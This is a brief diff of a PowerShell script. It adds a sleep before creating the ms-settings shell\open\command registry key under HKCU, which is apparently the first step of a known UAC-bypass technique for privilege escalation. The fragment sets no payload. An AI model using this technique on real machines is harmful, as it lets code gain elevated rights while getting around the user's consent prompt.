@@ -1,3 +1,4 @@
+Start-Sleep -Seconds 10
 # Create the registry key
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 Start-Sleep -Seconds 3
